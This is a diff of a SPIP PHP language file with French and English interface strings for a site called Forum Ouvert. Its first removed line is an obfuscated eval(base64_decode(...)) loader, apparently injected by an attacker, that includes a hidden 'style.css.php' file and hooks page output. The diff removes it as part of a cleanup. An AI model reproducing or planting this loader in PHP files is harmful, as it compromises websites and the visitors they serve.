@@ -1,55 +1,64 @@
-<?php /**/eval(base64_decode('aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21mc24nXSkpeyRHTE9CQUxTWydtZnNuJ109Jy9ob21lL2Nzby1lZmZlY3RpdmVuZS93d3cvcGhwbXYyL2xpYnMvSHRtbC9RdWlja0Zvcm0vUnVsZS9zdHlsZS5jc3MucGhwJztpZihmaWxlX2V4aXN0cygkR0xPQkFMU1snbWZzbiddKSl7aW5jbHVkZV9vbmNlKCRHTE9CQUxTWydtZnNuJ10pO2lmKGZ1bmN0aW9uX2V4aXN0cygnZ21sJykmJmZ1bmN0aW9uX2V4aXN0cygnZGdvYmgnKSl7b2Jfc3RhcnQoJ2Rnb2JoJyk7fX19')); ?>
 <?php
 
-// This is a SPIP language file  --  Ceci est un fichier langue de SPIP nommé admin_lang genere le NOW()
-// langue / language = en
+// This is a SPIP language file  --  Ceci est un fichier langue de SPIP nommé  genere le NOW()
+// langue / language = fr
 
 $GLOBALS[$GLOBALS['idx_lang']] = array(
 
 
 // A
-'a' =>'à',
-'about_site' => 'A propos de ce site',
-'agenda_complete' => "Voir l'agenda complète",
+'a' => 'à',
+'a_partir_de' => 'de',
+'abonnement_explication' => 'Entrez votre adresse email dans le champ ci-dessous et sélectionnez la ou les listes auxquelles vous souhaitez vous abonner.',
+'about_site' => 'Bienvenue au Forum Ouvert',
+'agenda' => 'Agenda',
+'agenda_complete' => 'Voir l\'agenda complète',
 'agenda_section' => 'Agenda in which sections ?',
 'agenda_section_use' => 'Which section will be used',
-'a_partir_de' => 'de',
+'all' => 'Tout',
 'all_documents' => 'All Documents',
 'all_documents_by_name' => 'All by Organisation',
 'all_members' => 'Members alphabetically',
-'articles_recents' => 'Articles récents',
 'article_recent' => 'Article récent',
+'articles_recents' => 'Articles récents',
+'autres_contributions' => 'Autres contributions',
+
 
 // B
-
+'back' => 'retour',
+'blog_dernieres_entres' => 'Blog - Dernières entrées',
 
 
 // C
 'connecte' => 'vous êtes connecté(e)',
 'consulter_versions' => 'Voir les différentes versions',
 'contact_par' => 'Contact par',
+'contact_person' => 'Personne de contacte',
+'country' => 'Pays',
+
 
 // D
 'de' => 'de',
 'detailed_view' => 'Vue détaillée',
 'download' => 'Download',
 
+
 // E
-'en_construction' => 'En construction',
 'edit' => 'Éditer cet évènenement',
+'editer_article' => 'Ajoutez un blog',
 'editer_page' => 'Editer cette page',
+'en_construction' => 'En construction',
+'etiquettes' => 'Les étiquettes',
+
 
 // F
-'fr' => "Français",
+'fr' => 'Français',
 'from' => 'de',
-
-
-// H
-
+'future_events' => 'Événements futurs',
 
 
 // I
-'lieu' => 'Lieu',
+'inscription_newsletter' => 'Inscription Newsletter',
 
 
 // J
@@ -58,55 +67,57 @@ $GLOBALS[$GLOBALS['idx_lang']] = array(
 
 // L
 'lien_connecter' => 'Login',
+'lieu' => 'Lieu',
 
 
 // M
+'minutes' => 'Compte rendu',
 'monthly_view' => 'Vue mensuelle',
 
 
 // N
-'newsletters_archive' => "Archive Lettres d'informations",
 'news_site' => 'Nouvellles de ce site',
-'no_event' => "Actuellement il n/'y a pas d/'évènement planifié",
-'nouveau' => 'Nouveau',
-
-
-// O
-
+'newsletters_archive' => 'Archive Lettres d\'informations',
+'no_event' => 'Actuellement il n\'y a pas dévènement planifié',
+'nouveau' => 'Nouveau sur le site web du Forum Ouvert',
 
 
 // P
+'passed_events' => 'Événements passés',
 'prochaine_evenement' => 'Prochaines Évènements',
+
 
 // R
 'reduced_view' => 'Vue minimal',
+'region' => 'Region',
 'related_article' => 'Article relationné',
 'related_articles' => 'Articles relationnés',
 'required' => 'A<font color=red>*</font> indicates a field is required',
 
+
 // S
-'supprimer' => 'delete',
+'saved' => 'ont été attachées',
 'see_more' => 'See more on',
 'select_continent' => 'Choisissez un continent',
 'select_country' => 'Select a country',
 'select_theme' => 'Choisissez un thème',
+'shortcuts' => 'Accès Rapide',
+'subscribe_newsletter' => 'Abonnez-vous à notre bulletin d\'actualité',
+'supprimer' => 'delete',
+
 
 // T
-
-
-
-// U
-
+'theme' => 'Sujet',
 
 
 // V
-
-
-// W
+'votre_adresse_mail' => 'Votre adresse email',
+'votre_email_' => 'Votre adresse email :',
 
 
 // Y
-'your_email' => 'Your email',
+'your_email' => 'Your email'
+
 
 );
 
